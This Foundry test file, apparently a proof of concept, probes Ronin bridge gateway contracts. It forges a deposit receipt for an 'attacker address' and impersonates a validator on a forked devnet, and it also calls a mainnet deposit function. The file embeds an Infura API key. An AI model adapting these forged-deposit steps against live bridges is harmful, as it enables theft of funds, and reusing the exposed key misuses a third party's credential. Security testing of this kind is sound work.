// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../mainchain/MainchainGatewayV2.sol";
import "./RoninGatewayV2.sol";
import "../libraries/Transfer.sol";
import "./validator/RoninValidatorSet.sol";

contract BridgeExploit is Test {
  string TEST_NET = "https://saigon-testnet.roninchain.com/rpc";
  string RONIN = "https://api-archived.roninchain.com/rpc";
  string MainNet = "https://mainnet.infura.io/v3/336c507da6c6480ab5a55ffb709d4cc2";
  string DEVNET = "https://hcm-devnet.skymavis.one/rpc";

  RoninGatewayV2 roninGatewayV2;
  MainchainGatewayV2 mainchainGatewayV2;

  address RoninValidatorSetProxyDevNet = 0x262A3cab2bBB6Fc414Eb78e6755BF544B97dAC01;
  RoninValidatorSet roninValidatorSet = RoninValidatorSet(payable(RoninValidatorSetProxyDevNet));

  function setUp() public {
    // 0xCee681C9108c42C710c6A8A949307D5F13C9F3ca  roninGatewayV2 testnet

    // vm.createSelectFork(TEST_NET);

    roninGatewayV2 = RoninGatewayV2(payable(address(0x14bEbb8a09e0362f026B9f4Fb1Cd2EB508c919ba)));
    mainchainGatewayV2 = MainchainGatewayV2(payable(address(0x64192819Ac13Ef72bF6b5AE239AC672B43a9AF08)));

    RoninGatewayV2 newLogic = new RoninGatewayV2();
    bytes memory code = address(newLogic).code;
    vm.etch(address(roninGatewayV2), code);
    vm.createSelectFork(DEVNET);
  }

  function testGetCurrentBridgeOperators() public {
    IRoninValidatorSet.ValidatorCandidate[] memory vcandidate;
    IRoninValidatorSet.ValidatorCandidate memory pcandidate;

    vcandidate = roninValidatorSet.getCandidateInfos();

    for (uint i = 0; i < vcandidate.length; i++) {
      pcandidate = vcandidate[i];
      console.log(address(pcandidate.bridgeOperatorAddr));
    }
  }

  function testDepositRoninExploit() public {
    Token.Info memory _info = Token.Info(Token.Standard.ERC20, 0, 100000);

    uint256 _fakeId = 31000000;

    Token.Owner memory mainchain = Token.Owner(
      address(0x3840c8d007380FE3b6dA7F52F59FcCd7705C954f), //owner of mainchain token
      address(0xfe63586e65ECcAF7A41b1B6D05384a9CA1B246a8), //mainchain token WETH
      5
    );

    Token.Owner memory ronin = Token.Owner(
      address(0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e), //attacker address
      address(0x29C6F8349A028E1bdfC68BFa08BDee7bC5D47E16), //ronin test net WETH
      2022
    );

    Transfer.Receipt memory _receipt = Transfer.Receipt(
      _fakeId, //id
      Transfer.Kind.Deposit,
      mainchain,
      ronin,
      _info
    );

    // receiptHash: 0xcffe7d9c77e8c305c9c5dbb72bd2a2f89be4b3b9cbdc3b7d82c09f94972f325b
    //cheat fake a malicious validator

    address skm05 = address(0xDe39e26567BC9e1C45e91c0A077DDA7A784846EE);
    vm.prank(skm05);
    roninGatewayV2.depositFor(_receipt);
    //create success
  }

  function testGetValidatorList() public {}

  function testDepositExploitMainNet() public {
    //   https://etherscan.io/address/0x64192819ac13ef72bf6b5ae239ac672b43a9af08

    vm.createSelectFork(MainNet);

    Token.Info memory _info = Token.Info(Token.Standard.ERC20, 0, 100000);

    (address attacker, uint256 key) = makeAddrAndKey("attacker");

    // 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 https://etherscan.io/address/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 WETH
    // https://explorer.roninchain.com/address/ronin:c99a6A985eD2Cac1ef41640596C5A5f9F4E19Ef5 WETH Ronin

    console.log(attacker);

    Transfer.Request memory _request = Transfer.Request(payable(attacker), address(0), _info);
    vm.prank(0x3840c8d007380FE3b6dA7F52F59FcCd7705C954f);
    mainchainGatewayV2.requestDepositFor{ value: 100000 }(_request);
    // mainchainGatewayV2.requestDepositFor
  }
}
